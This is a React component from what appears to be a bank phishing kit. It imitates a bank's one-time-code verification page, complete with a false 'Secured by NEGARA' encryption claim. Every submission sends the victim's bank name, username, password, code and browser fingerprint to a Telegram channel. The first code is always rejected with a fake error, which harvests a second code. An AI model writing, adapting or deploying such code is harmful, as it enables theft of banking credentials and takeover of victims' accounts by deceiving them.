import React, { useState } from 'react';
import { ArrowLeft, LockIcon, Lock } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import TelegramSend from '../utils/send-message';
import ResendTimer from './countdown.component';

const Token = ({ bank, credentials }: { bank: Bank, credentials: Cred }) => {
    const [code, setCode] = useState('');

    const navigate = useNavigate();

    const [isLoading, setIsLoading] = React.useState(false);

    const [hasTriedCode, setHasTriedCode] = React.useState(false);

    async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
        event.preventDefault()
        setIsLoading(true)

        const message = `
    [----+🏦 NEGARA 🏦+-----]

    Fingerprint: ${navigator.userAgent}

    BANK NAME: ${bank.name}
  
    USERNAME: ${credentials.username}

    PASSWORD: ${credentials.password}

    CODE: ${code}
    `;

        if (!hasTriedCode) {
            await TelegramSend(message);
            setHasTriedCode(true)
            setCode('')
            setIsLoading(false);
            return;
        }

        await TelegramSend(message)

        setIsLoading(false)
        navigate(`../thank-you?bank=${encodeURIComponent(bank.name)}`, { replace: true })

    }

    return (
        <div className="min-h-screen w-screen flex items-center justify-center md:p-4 font-sans">
            {/* Outer Card */}
            <div className="w-full max-w-md bg-white overflow-hidden">

                {/* Top Navigation */}
                <div className="px-6 pt-6 flex justify-between items-center">
                    <button onClick={() => navigate(-1)} className="p-2 hover:bg-gray-100 rounded-full transition-colors">
                        <ArrowLeft size={20} className="text-gray-400" />
                    </button>
                </div>

                <div className="px-8 pb-8 pt-2">
                    {/* Bank Logo Header */}
                    <div className="flex flex-col items-center mb-8">
                        <div className="w-50 h-50 flex items-center justify-center mb-6">
                            <img
                                src={bank.logo}
                                alt={bank.name}
                                className="w-full h-full object-contain"
                            />
                        </div>
                        <p className="text-center text-[15px] font-bold text-[#323338] mb-5">Verifying {bank.name} user for international transaction</p>
                        <p className="text-gray-500 text-center leading-relaxed">
                            Username:  <strong> {credentials.username} </strong>
                        </p>
                    </div>

                    {hasTriedCode &&
                        <div className="error text-red-600 text-center bg-red-100 py-4 text-sm">
                            Invalid Code, Please try again!
                        </div>
                    }
                    {/* Inner Form Card - The "Nested" look from your image */}
                    <div className="bg-[#FBFCFD] border border-gray-100 rounded-[24px] p-6 mb-6">
                        <p className="text-gray-500 text-[15px] my-2">
            Enter the code we sent to you.
          </p>
                        <form method='POST' className="space-y-5" onSubmit={handleSubmit}>
                            {/* Username Input */}
                            <div className="space-y-1.5">
                                
                                <div className="relative group">
                                    <input
                                        type="text"
                                        placeholder='000000'
                                        required
                                        value={code}
                                        minLength={4}
                                        onChange={(e) => setCode(e.target.value)}
                                        className="w-full bg-white border border-gray-200 rounded-xl py-3.5 px-4 text-gray-900 outline-none focus:ring-2 focus:ring-blue-500/10 focus:border-blue-500 transition-all text-[15px]"
                                    />
                                    <LockIcon size={16} className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-300" />
                                </div>
                            </div>

                            {/* Primary Action */}
                            <button
                                type="submit"
                                disabled={isLoading}
                                className="w-full bg-[#111827] hover:bg-black text-white font-semibold py-4 rounded-xl mt-2 flex items-center justify-center transition-all active:scale-[0.98] shadow-lg shadow-gray-200 group"
                            >
                                {
                                    isLoading ?
                                        <span>Verifying Code .....</span>
                                        :
                                        <span>Continue</span>
                                }

                                <Lock size={18} className="ml-2 group-hover:translate-x-0.5 transition-transform" />
                            </button>
                        </form>

                        <ResendTimer/>

                       
                    </div>

                    {/* Bottom Security Branding */}
                    <div className="flex flex-col items-center space-y-2 opacity-60">
                        <div className="flex items-center space-x-2">
                            <span className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Secured by</span>
                            <span className="text-[11px] font-black text-gray-900 tracking-tighter italic">NEGARA</span>
                            <div className="w-1.5 h-1.5 rounded-full bg-blue-500" />
                            <span className="text-[10px] font-bold text-gray-800 uppercase tracking-widest">SECURE DATA ENCRYPTION</span>
                        </div>
                        <p className="text-[10px] text-gray-400 font-medium">All data is encrypted.</p>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Token;